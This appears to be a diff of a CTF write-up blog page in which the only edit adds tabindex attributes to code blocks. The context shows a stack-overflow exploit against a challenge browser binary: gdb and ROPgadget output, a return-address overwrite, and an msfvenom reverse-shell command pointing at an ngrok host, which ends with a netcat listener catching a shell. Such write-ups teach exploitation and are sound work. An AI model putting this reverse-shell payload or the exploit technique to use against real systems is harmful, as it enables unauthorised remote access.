@@ -122,7 +122,7 @@ To get an idea of what technologies are used in this browser, I open it up in a 
 <p>The decompilation is not perfect, but by looking at the assembly we quickly figure out what this function does : it allocates a stack buffer of size 0x80, zeroes it out, calculates the length of a global variable <code>app_name</code>, adds it to the stack buffer, concatenates the string <code>-</code> to the stack buffer, and finally concatenates the string passed as an argument. Given that this function is called by <code>webview_title_change</code>, I hypothesize this argument is the title.</p>
 <p>Let&rsquo;s check if this assumption is correct using a debugger. I will use <code>gdb</code>, with the <code>gef</code> python script.
 To do this, I set up a breakpoint at the 3rd <code>memcpy</code> and launch the browser. It is hit before the page is rendered.</p>
-<pre><code>memcpy@plt (                                                                                                                            
+<pre tabindex="0"><code>memcpy@plt (                                                                                                                            
    $rdi = 0x00007fffffffd33f -&gt; 0x0000000000000000,                        
    $rsi = 0x00000000007cb3a0 -&gt; 0x6e2065636e656741,    
    $rdx = 0x000000000000003a       
@@ -135,7 +135,7 @@ gef&gt;  x/s $rdi-15
 </code></pre><p>Our assumption was correct : we concatenate the title in the <code>&lt;title&gt;</code> in the stack buffer. We also know that the <code>app_name</code> is <code>FCSC Browser</code> at runtime.</p>
 <p>Looking back at the <code>addBrowser</code> function, I don&rsquo;t see any size check on the title. Could this lead to a stack overflow ? There might be preconditions or checks before the call to <code>addBrowser</code>, but it is worth a try.</p>
 <p>First, let&rsquo;s find out what protection are enabled on this binary to know what to expect - if there is a stack canary or not.</p>
-<pre><code>$ checksec fcsc_browser
+<pre tabindex="0"><code>$ checksec fcsc_browser
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -160,7 +160,7 @@ payload += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;
 <p>We get a crash !</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>In <code>gdb</code>, this is the ouput we get from the crash :</p>
-<pre><code>[!] Cannot disassemble from $PC
+<pre tabindex="0"><code>[!] Cannot disassemble from $PC
 
 [#0] Id 1, Name: &quot;fcsc_browser&quot;, stopped 0x407f82 in addBrowser(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) (), reason: SIGSEGV
 [#1] Id 2, Name: &quot;BMScavenger&quot;, stopped 0x7ffff1b387b2 in futex_wait_cancelable (), reason: SIGSEGV
@@ -186,7 +186,7 @@ Again, because <code>NX</code> is not enabled, we could jump to our shellcode in
 <div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + <span style="color:#a31515">b</span><span style="color:#a31515">&#39;A&#39;</span>*4
 </code></pre></div><p>at the end of the <code>addBrowser</code> function, our return address is <code>0x0000000041414141</code>. Therefore, we can partially overwrite this return address to point to any gadget we want. However, that means we can only use one gadget, because we can&rsquo;t write anything afterwards.</p>
 <p>How do we exploit this ? Let&rsquo;s check out our registers at the end of <code>addBrowser</code> when overwriting the return address.</p>
-<pre><code>gef&gt;  registers 
+<pre tabindex="0"><code>gef&gt;  registers 
 $rax   : 0x00007fffffffd3f0  -&gt;  0x0000000000acaa30  -&gt;  &quot;FCSC Browser - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]&quot;
 $rbx   : 0x6161616161616161 (&quot;aaaaaaaa&quot;?)
 $rcx   : 0x1b              
@@ -221,7 +221,7 @@ e:   20                      .byte 0x20
 </code></pre></div><p>For this to work, we would need a gadget that adds at least 15 to one those registers, then jumps to it. I did find a <code>call rdi</code> and a <code>jmp rcx</code>, but they were not preceded by any addition that suits us.</p>
 <p>What about <code>rax</code> ? It is a pointer to the address of our string, for this to work, we would need a slightly different gadget : add at least 15 to the valued pointed by <code>rax</code>, then jump to the value pointed by <code>rax</code>.</p>
 <p>Using <code>ROPgadget</code> I did find one that matched (remember that <code>rcx</code> has a value of <code>0x1b</code>)</p>
-<pre><code>$ ROPgadget --binary fcsc_browser | grep 'jmp qword ptr \[rax'
+<pre tabindex="0"><code>$ ROPgadget --binary fcsc_browser | grep 'jmp qword ptr \[rax'
 ...
 0x0000000000403d77 : add byte ptr [rax], cl ; jmp qword ptr [rax]
 ...
@@ -257,7 +257,7 @@ payload += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;
 </code></pre></div><p>This nearly works, expected for one detail : if we debug the program, we jump to our shellcode, but it is not exactly the same. I did not spend too much time figuring out why, I noticed some bytes were modified and other were not, but my educated guess would be after hovering over the code, that the title is utf-8 decoded, which transforms the shellcode.
 It took me some time to find out exactly which bytes were modified, but I ended generating my shellcode with <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=2.tcp.ngrok.io LPORT=15636 -b '\x00\x80\x83\x84\x85\x86\x87\x8b\x82\x89\x99\x91\x92\x93\x94\x95\x96\x9b\x97\x98\x9a\x9c\x9e\x9f\x8a\x8e\x0d\x0a\x0c\x8c\x09\x88' -f py</code></p>
 <p>I replaced the <code>buf</code> in the above python script by the new output, and this time, it worked ! I set up a webserver, gave a link to <code>exploit.html</code> to the bot and after a few seconds, we get a shell !</p>
-<pre><code class="language-raw" data-lang="raw">$ nc -lvnp 1234
+<pre tabindex="0"><code class="language-raw" data-lang="raw">$ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57666
 id
